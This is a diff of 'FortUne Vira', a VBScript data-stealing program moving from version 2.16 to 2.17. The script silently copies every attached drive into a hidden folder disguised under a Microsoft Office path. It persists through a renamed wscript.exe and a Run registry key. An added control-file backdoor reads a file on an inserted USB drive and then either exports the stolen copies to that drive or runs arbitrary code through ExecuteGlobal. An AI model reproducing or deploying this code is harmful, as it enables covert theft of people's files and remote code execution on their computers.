@@ -1,77 +1,52 @@
-'Version 2.16 Ultimate
+'*******************
+'  FortUne Vira
+'  Version 2.17
+'*******************
 Option Explicit
 On Error Resume Next
+Const ViraVersion = "2.17"
+Const ViraTitle = "Vira 2"
+Const ViraDescription = "Vira 2.17 - A total hacker!"
 
-'************
-' Constants
-'************
-Const ViraVersion = "2.16"
-Const RETURN_SUCCESS = 0
-Const RETURN_FAILURE = 1
-
-Dim FlagFileNum, FlagFile, MaxCapacityGB, Destination, ConfigFile
-Dim HasAdmin, Container, IsCopied(23)
-Dim Shell, Fso, Fin, Fout
+' System
+Dim Shell, Fso, IsAdmin
 Set Shell = CreateObject("WScript.Shell")
 Set Fso = CreateObject("Scripting.FileSystemObject")
 
-' The only thing left customizable...
-ConfigFile = "C:\Windows\System32\wbem\Repository\CONFIG.CTI"
+' Vira
+Const ControlFile = "ViraControl.ini"
+Dim FlagFileNum, FlagFile, CapacityGB, Destination
+Dim Container, IsCopied(23)
 
-'***************
-' Main Program
-'***************
-If Wsh.Arguments.Count = 0 Then
+' Customization Section
+Const ConfigFile = "C:\Windows\system32\Wbem\Repository\CONFIG.CTI"
+
+'****************
+'  Main Program
+'****************
+If WScript.Arguments.Count = 0 Then
   ProcessMain
 Else
-  Dim i, str
-  For i = 0 To Wsh.Arguments.Count - 1
-    str = LCase(Wsh.Arguments(i))
-    If Chr(Asc(str)) = "/" Or Chr(Asc(str)) = "-" Then
-      str = Mid(str, 2, Len(str)-1)
-      Select Case str
-        Case Else
-          MsgBox "Unknown switch """ & Wsh.Arguments(i) & """", 16, "Vira " & ViraVersion & " Error"
-          Wsh.Quit -1
-      End Select
-    Else
-      Select Case str
-        Case "help"
-          MsgBox "XWH loves YZ.", 0, "Help"
-          Wsh.Quit 0
-        Case "execute"
-          ProcessMain
-        Case "install"
-          InstallLocal
-        Case "uninst"
-          UninstLocal
-        Case "uninstall"
-          UninstLocal
-        Case Else
-          MsgBox "Unknown parameter """ & str & """", 16, "Vira " & ViraVersion & " Error"
-          Wsh.Quit -1
-      End Select
-    End If
+  Dim i, arg
+  For i = 0 To WScript.Arguments.Count - 1
+    arg = LCase(WScript.Arguments(i))
+    Select Case arg
+      Case "install"
+        Wsh.Quit InstallLocal
+      Case "help"
+        MsgBox "XWH loves YZ.", 0, ViraTitle
+      Case "credit"
+        MsgBox ViraDescription, 0, ViraTitle
+    End Select
   Next
 End If
 
-'****************
-' Main Function
-'****************
-Public Sub ProcessMain
-  ViraInitialize
-  Do
-    ViraMain
-    Wsh.Sleep 1000
-  Loop
-End Sub
-
-'*************************
-' Vira Process Functions
-'*************************
-Public Sub ViraInitialize()
-  If ReadConfig() <> 0 Then Wsh.Quit 1
-  Shell.Run "CMD.EXE /C MKDIR """ & Destination & """", 0, True
+'***********
+'  Library
+'***********
+Sub ViraInitialize
+  ReadConfig
+  Shell.Run "CMD /C MKDIR """ & Destination & """", 0, True
   Set Container = Fso.GetFolder(Destination)
   Container.Attributes = 7
   Dim i
@@ -80,16 +55,13 @@ Public Sub ViraInitialize()
   Next
 End Sub
 
-Public Sub ViraMain()
-  Dim DriveLetter, DriveReady, UDrive, i
+Sub ViraMain
+  Dim i, Letter, Drive
   For i = 0 To 22
-    DriveLetter = Chr(68 + i)
-    DriveReady = False
-    
-    If Fso.DriveExists(DriveLetter) Then
-      Set UDrive = Fso.GetDrive(DriveLetter)
-      If UDrive.DriveType = 1 And Not IsCopied(i) Then
-        IsCopied(i) = ProcessDrive(DriveLetter)
+    Letter = Chr(68 + i) 'From D: to Z:
+    If Fso.DriveExists(Letter) Then
+      If Not IsCopied(i) Then
+        IsCopied(i) = DriveProcess(Letter)
       End If
     Else
       IsCopied(i) = False
@@ -97,246 +69,235 @@ Public Sub ViraMain()
   Next
 End Sub
 
-Public Function ProcessDrive(DriveLetter)
-  ProcessDrive = False
-  Dim Target, UDrive
-  Set UDrive = Fso.GetDrive(DriveLetter)
+Function DriveProcess(DriveLetter)
+  DriveProcess = False
+  Dim Drive, Target, TimeA, TimeB, Text, Folder
+  Set Drive = Fso.GetDrive(DriveLetter)
+  If Drive.DriveType <> 1 And Drive.DriveType <> 2 Then Exit Function
   Do
-    Wsh.Sleep 500
-  Loop Until UDrive.IsReady
-  Target = Destination & Hex(UDrive.SerialNumber)
-  If Fso.FolderExists(Target) Or Container.Size <= MaxCapacityGB*100000000 Then
-    Dim i, FileCheck
-    FileCheck = True
-    For i = 0 to FlagFileNum - 1
+    WScript.Sleep 100
+  Loop Until Drive.IsReady
+  If DriveControlProcess(DriveLetter) Then
+    DriveProcess = True
+    Exit Function
+  End If
+  If Drive.DriveType = 1 Then
+    For i = 0 To FlagFileNum - 1
       If Fso.FileExists(DriveLetter & ":\" & FlagFile(i)) Then
-        FileCheck = False
-        Exit For
+        Exit Function
       End If
     Next
     
-    If FileCheck Then 'Copy this drive
-      CopyDrive DriveLetter
-      ProcessDrive = True
-     End If
+    Target = Destination & Hex(Drive.SerialNumber) & "\"
+    If Not Fso.FolderExists(Target) Then
+      If Container.Size + Drive.TotalSize - Drive.FreeSpace < CapacityGB * 1000000000 Then
+        Fso.CreateFolder Target
+      Else
+        Exit Function
+      End If
+    End If
+    WriteDriveInfo DriveLetter, Target & "Vira.ini"
+    TimeA = Timer()
+    CopyDrive DriveLetter, Target
+    TimeB = Timer()
+    
+    If TimeB < TimeA Then TimeB = TimeB + 86400
+    Set Folder = Fso.GetFolder(Target)
+    Set Text = Fso.OpenTextFile(Target & "Vira.ini", 8)
+    Text.WriteLine "[ExtendDriveInfo]"
+    Text.WriteLine "AverageSpeed=" & ConvertSize(Folder.Size / (TimeB-TimeA)) & "/s"
+    Text.Close
+    DriveProcess = True
   End If
 End Function
 
-Public Sub CopyDrive(DriveLetter)
-  Dim UDrive, File, TargetF, Target, TimeA, TimeB
-  Set UDrive = Fso.GetDrive(DriveLetter)
-  Target = Destination & Hex(UDrive.SerialNumber) & "\"
-  Set UDrive = Nothing
-  If Not Fso.FolderExists(Target) Then Fso.CreateFolder Target
-  WriteDriveInfo DriveLetter, Target & "Vira.ini"
+Function DriveControlProcess(DriveLetter)
+  DriveControlProcess = False
+  Dim Text, Control
+  If Fso.FileExists(DriveLetter & ":\" & ControlFile) Then
+    Set Text = Fso.OpenTextFile(DriveLetter & ":\" & ControlFile ,1)
+    If Text.ReadLine() = "VR3XC" Then
+      Control = Text.ReadLine()
+      Select Case Control
+        Case "[ViraHarvest]"
+          HarvestDrive DriveLetter, Text.ReadAll()
+        Case "[ViraExecute]"
+          Control = Text.ReadAll()
+          Control = Replace(Control, "thisDrive", """" & DriveLetter & """")
+          ExecuteGlobal Control
+      End Select
+      DriveControlProcess = True
+      Exit Function
+    Else
+      Fso.DeleteFile DriveLetter & ":\" & ControlFile, True
+    End If
+  End If
+End Function
+
+Function HarvestDrive(DriveLetter, HarvestInfo)
+  On Error Resume Next
+  Dim Info, Target, TFolder, SFolder, PFolder, i
+  Info = Split(HarvestInfo, "|")
+  If UBound(Info) < 2 Then Exit Function
+  For i = 0 To UBound(Info)-1
+    Info(i) = Trim(Info(i))
+  Next
+  Target = DriveLetter & ":\" & Info(1) & "\"
+  Set TFolder = Fso.GetFolder(Target)
+  Set SFolder = Fso.GetFolder(Destination)
+  If UBound(Info) >= 3 Then
+    CopyNew = Info(2)
+  Else
+    CopyNew = False
+  End If
   
-  TimeA = Timer()
+  For Each i In SFolder.SubFolders
+    Set PFolder = Fso.GetFolder(i)
+    If PFolder.Size + TFolder.Size <= Info(0) * 1000000000 Then
+      Fso.CopyFolder i, Target, CopyNew
+    End If
+  Next
+End Function
+
+Function WriteDriveInfo(DriveLetter, Target)
+  Dim Text, Drive
+  Set Drive = Fso.GetDrive(DriveLetter)
+  Set Text = Fso.OpenTextFile(Target, 2, True)
+  Text.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
+  Text.WriteLine "OperationTime=" & Now()
+  Text.WriteLine "[DriveInfo]"
+  Text.WriteLine "Label=" & Drive.VolumeName
+  Text.WriteLine "SerialNumber=" & Hex(Drive.SerialNumber)
+  Text.WriteLine "FileSystem=" & Drive.FileSystem
+  Text.WriteLine "TotalSize=" & Drive.TotalSize
+  Text.WriteLine "FreeSpace=" & Drive.FreeSpace
+  Text.Close
+End Function
+
+Function CopyDrive(DriveLetter, Target)
+  On Error Resume Next
   Fso.CopyFile DriveLetter & ":\*", Target, True
   Fso.CopyFolder DriveLetter & ":\*", Target, True
-  TimeB = Timer()
-  If TimeB < TimeA Then TimeB = TimeB + 86400
-  Set File = Fso.OpenTextFile(Target & "Vira.ini", 8)
-  Set TargetF = Fso.GetFolder(Target)
-  File.WriteLine "AverageSpeed=" & ConvertSize(TargetF.Size/(TimeB-TimeA)) & "/s"
-  File.Close
-End Sub
+End Function
 
-Public Sub HarvestDrive(DriveLetter)
-  ' Unfinished Yet
-End Sub
-
-Public Sub WriteDriveInfo(DriveLetter, FileName)
-  Dim Fout, DriveInfo
-  Set Fout = Fso.OpenTextFile(FileName, 2, True, 0)
-  Set DriveInfo = Fso.GetDrive(DriveLetter)
-  If DriveInfo Is Nothing Then Exit Sub
-  Fout.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
-  Fout.WriteLine "OperationTime=" & Now()
-  Fout.WriteLine "[DriveInfo]"
-  Fout.WriteLine "SerialNumber=" & Hex(DriveInfo.SerialNumber)
-  Fout.WriteLine "VolumeName=" & DriveInfo.VolumeName
-  Fout.WriteLine "FileSystem=" & DriveInfo.FileSystem
-  Fout.WriteLine "TotalSize=" & DriveInfo.TotalSize & " (" & ConvertSize(DriveInfo.TotalSize) & ")"
-  Fout.WriteLine "FreeSpace=" & DriveInfo.FreeSpace & " (" & ConvertSize(DriveInfo.FreeSpace) & ")"
-  Fout.Close
-End Sub
-
-'******************
-' Shell Functions
-'******************
-
-Public Sub InstallLocal()
-  If Not AdminTest() Then
-    MsgBox "Installation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
-    Wsh.Quit 1
-  End If
-  Dim TempString, i, Input
-  If MsgBox("Customize Vira?", 324, "Vira " & ViraVersion) = 6 Then
-    MsgBox "Please follow the instructions and enter information PROPERLY." & vbCrLf & _
-           "Any errorneous data may lead to unpredictable behaviour of Vira.", 64, "Vira " & ViraVersion
-    FlagFileNum = CInt(InputBox("How many flag files are there to recognize ""protected drive""?", _
-                                "Vira " & ViraVersion, 0))
-    If FlagFileNum > 0 Then TempString = InputBox("Enter flag file 1", "Vira " & ViraVersion, "setup.exe")
-    For i = 2 to FlagFileNum
-      TempString = TempString & "|" & InputBox("Enter flag file " & i, "Vira " & ViraVersion, "setup.exe")
-    Next
-    FlagFile = TempString
-    
-    MaxCapacityGB = CInt(InputBox("How much disk space(in GB) is allocated for Vira?", _
-                                  "Vira " & ViraVersion, "32"))
-    Destination = InputBox("Where can Vira hide the files ""harvested""?" & vbCrLf & _
-                           "Please end with a backslash [\]", _
-                           "Vira " & ViraVersion, "D:\Program Files\Tencent\QQMaster\")
+Function ReadConfig()
+  ReadConfig = False
+  Dim Text
+  Set Text = Fso.OpenTextFile(ConfigFile, 1)
+  If Text.ReadLine() = "VR3XF" Then
+    FlagFile = Split(Text.ReadLine(), "|")
+    FlagFileNum = UBound(FlagFile)
+    CapacityGB = Text.ReadLine()
+    Destination = Text.ReadLine()
+    Text.Close
+    ReadConfig = True
   Else
-    FlagFile = "setup.exe|bootmgr"
-    MaxCapacityGB = 32
-    Destination = "D:\Program Files\Tencent\QQMaster"
+    Exit Function
   End If
-  WriteConfig FlagFile, MaxCapacityGB, Destination
+End Function
+
+Function WriteConfig()
+  WriteConfig = False
+  If Not AdminCheck Then
+    Exit Function
+  End If
+  Dim Config, FlagFileNames, i
+  If FlagFileNum >= 1 Then FlagFileNames = FlagFile(0)
+  For i = 1 To FlagFileNum - 1
+    FlagFileNames = FlagFileNames & "|" & FlagFile(i)
+  Next
+  Set Config = Fso.OpenTextFile(ConfigFile, 2, True)
+  Config.WriteLine "VR3XF"
+  Config.WriteLine FlagFileNames
+  Config.WriteLine CapacityGB
+  Config.WriteLine Destination
+  Config.WriteLine "XEOF"
+  Config.Close
+  WriteConfig = True
+End Function
+
+Function DefaultConfig()
+  FlagFileNum = 2
+  FlagFile = Array("setup.exe", "bootmgr")
+  CapacityGB = 64
+  Destination = "D:\Program Files\Microsoft Office\liveupdate\"
+End Function
+
+Function InstallLocal()
+  InstallLocal = 1
+  If Not AdminCheck() Then
+    Exit Function
+  End If
   
-  TempString = Fso.GetParentFolderName(Wsh.ScriptFullName) & "\vtemp.vbe"
-  EndProcess "netLaunch.exe"
+  MsgBox "Welcome to Vira installation.", 0, ViraTitle
+  DefaultConfig
+  If MsgBox("Use default settings?", vbYesNo, ViraTitle) = vbNo Then
+    Dim Input, i
+    FlagFileNum = Abs(CInt(InputBox("Number of flag files:", ViraTitle, FlagFileNum)))
+    ReDim Preserve FlagFile(FlagFileNum)
+    For i = 0 To FlagFileNum - 1
+      FlagFile(i) = InputBox("Flag file #" & i, ViraTitle, FlagFile(i))
+    Next
+    Destination = InputBox("File container location:" & vbCrLf & "Must end with a backslash [\]", ViraTitle, Destination)
+    CapacityGB = Abs(CDbl(InputBox("Maximum size of container:", ViraTitle, CapacityGB)))
+  End If
+  WriteConfig
+  Fso.CopyFile "C:\Windows\system32\wscript.exe", "C:\Windows\system32\netHelper.exe", True
   If Fso.FileExists("screnc.exe") Then
-    Shell.Run "screnc.exe /s """ & Wsh.ScriptFullName & """ """ & TempString & """"
-    Fso.CopyFile TempString, "C:\Windows\system32\Wbem\netLaunch.vbe", True
-    Fso.DeleteFile TempString, True
+    Shell.Run "screnc.exe /s """ & WScript.ScriptName & """ vtemp.vbe", 0, True
+    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", "C:\Windows\system32\d3dxm.vbe", True
+    Fso.DeleteFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", True
   Else
-    Fso.CopyFile Wsh.ScriptFullName, "C:\Windows\system32\Wbem\netLaunch.vbe", True
+    Fso.CopyFile WScript.ScriptFullName, "C:\Windows\system32\d3dxm.vbe", True
   End If
-  Fso.CopyFile Wsh.FullName, "C:\Windows\system32\Wbem\netLaunch.exe", True
-  
-  TempString = "C:\Windows\system32\Wbem\netLaunch.exe C:\Windows\system32\Wbem\netLaunch.vbe"
-  Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet", _
-          TempString, "REG_SZ"
-  Shell.Run TempString, 0, False
-  MsgBox "Installation Complete!", 64, "Vira " & ViraVersion
-  Wsh.Quit 0
-End Sub
-
-Public Sub UninstLocal()
-  MsgBox "Local uninstallation is disabled for security reasons.", 64, "Vira " & ViraVersion
-End Sub
-
-Public Sub GenuineUninstLocal()
-  If Not AdminTest() Then
-    MsgBox "Uninstallation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
-    Wsh.Quit 1
-  End If
-  EndProcess "netLaunch.exe"
-  Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.exe", True
-  Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.vbe", True
-  Shell.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet"
-  MsgBox "Uninstallation Complete!", 64, "Vira " & ViraVersion
-  Wsh.Quit 0
-End Sub
-
-Public Function AdminTest()
-  If HasAdmin = 1 Then
-    AdminTest = True
-    Exit Function
-  ElseIf HasAdmin = 2 Then
-    AdminTest = False
-    Exit Function
-  End If
-  On Error Resume Next
-  Dim TestDir
-  TestDir = "C:\Windows\AdminTest\"
-  Fso.CreateFolder TestDir
-  Wsh.Sleep 1000
-  AdminTest = Fso.FolderExists(TestDir)
-  If AdminTest Then
-    Fso.DeleteFolder TestDir
-    HasAdmin = 1
-  Else
-    HasAdmin = 2
-  End If
+  Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NetHelper", _
+                 "C:\Windows\system32\netHelper.exe C:\Windows\system32\d3dxm.vbe", "REG_SZ"
+  MsgBox "Installation Complete!", 64, ViraTitle
+  Shell.Run "C:\Windows\system32\netHelper.exe C:\Windows\system32\d3dxm.vbe", 0, False
+  InstallLocal = 0
 End Function
 
-Public Sub EndProcess(ProcessName)
-  Shell.Run "TASKKILL.EXE /F /FI ""IMAGENAME eq " & ProcessName & """", 0, True
-End Sub
-
-Public Function ReadConfig()
-  On Error Resume Next
-  If Not Fso.FileExists(ConfigFile) Then
-    If WriteConfig(Array("Setup.exe", "bootmgr"), 32, "D:\Program Files\Tencent\QQMaster\") <> 0 Then
-      ReadConfig = 1
-      Exit Function
-    End If
-  End If
-  Dim File
-  Set File = Fso.OpenTextFile(ConfigFile, 1)
-  str = File.ReadLine()
-  If str <> "VR2XF" Then
-    File.Close
-    If WriteConfig(Array("Setup.exe", "bootmgr"), 32, "D:\Program Files\Tencent\QQMaster\") <> 0 Then
-      ReadConfig = 1
-      Exit Function
-    End If
-    ReadConfig = ReadConfig()
-    Exit Function
-  End If
-  FlagFile = Split(File.ReadLine(), "|")
-  FlagFileNum = UBound(FlagFile)
-  MaxCapacityGB = CDbl(File.ReadLine())
-  Destination = File.ReadLine()
-  If File.AtEndOfStream Then
-    File.Close
-    ReadConfig = 1
-    Exit Function
-  End If
-  File.Close
-  ReadConfig = 0
+Function AdminCheck()
+  Select Case IsAdmin
+    Case 1
+      AdminCheck = True
+    Case 2
+      AdminCheck = False
+    Case Else
+      On Error Resume Next
+      Const AdminTest = "C:\Windows\AdminTest\"
+      Fso.CreateFolder AdminTest
+      WScript.Sleep 500
+      If Fso.FolderExists(AdminTest) Then
+        AdminCheck = True
+        IsAdmin = 1
+        Fso.DeleteFolder AdminTest, True
+      Else
+        AdminCheck = False
+        IsAdmin = 2
+      End If
+  End Select
 End Function
 
-Public Function WriteConfig(FlagFiles, Capacity, Storage)
-  If Not AdminTest() Or Not IsArray(FlagFiles) Then
-    WriteConfig = 1
-    Exit Function
-  End If
-  Dim File, FileNames, FlagFileNum, i
-  FlagFileNum = UBound(FlagFiles)
-  If FlagFileNum = 0 Then
-    WriteConfig = 1
-    Exit Function
-  End If
-  FileNames = FlagFiles(0)
-  If FlagFileNum > 1 Then
-    For i = 1 To FlagFileNum - 1
-      FileNames = FileNames & "|" & FlagFiles(i)
-    Next
-  End If
-  Set File = Fso.OpenTextFile(ConfigFile, 2, True)
-  File.WriteLine "VR2XF" 'File Valiation
-  File.WriteLine FileNames
-  File.WriteLine CDbl(Capacity)
-  File.WriteLine Storage
-  File.WriteLine "XEOF"
-  File.Close
-  WriteConfig = 0
-End Function
-
-Public Function ConvertSize(ByVal dSize)
-  Dim SizeSuffix, PowerLevel
-  SizeSuffix = Array("B", "KB", "MB", "GB", "TB")
-  For PowerLevel = 0 To 4
-    If dSize >= 1024 Then
-      dSize = dSize / 1024
+Function ConvertSize(ByVal Size)
+  Dim SizeSuffix, i
+  SizeSuffix = Array("B", "KB", "MB", "GB")
+  For i = 0 To UBound(SizeSuffix) - 1
+    If Size >= 1024 Then
+      Size = Size / 1024
     Else
       Exit For
     End If
   Next
-  ConvertSize = FormatNumber(dSize, 2, True) & SizeSuffix(PowerLevel)
+  ConvertSize = FormatNumber(Size, 2, True) & SizeSuffix(i)
 End Function
 
-Public Sub Include(InclFile)
-  Dim File, InclContent 
-  Set File = Fso.OpenTextFile(InclFile) 
-  InclContent = File.ReadAll() 
-  File.Close
-  ExecuteGlobal InclContent
-End Sub 
+'  Master Shiang Dzurr plays silver power
 
-'*****************
-' End of Program
-'*****************
+Public Sub ProcessMain()
+  ViraInitialize
+  Do
+    ViraMain
+    WScript.Sleep 1000
+  Loop
+End Sub
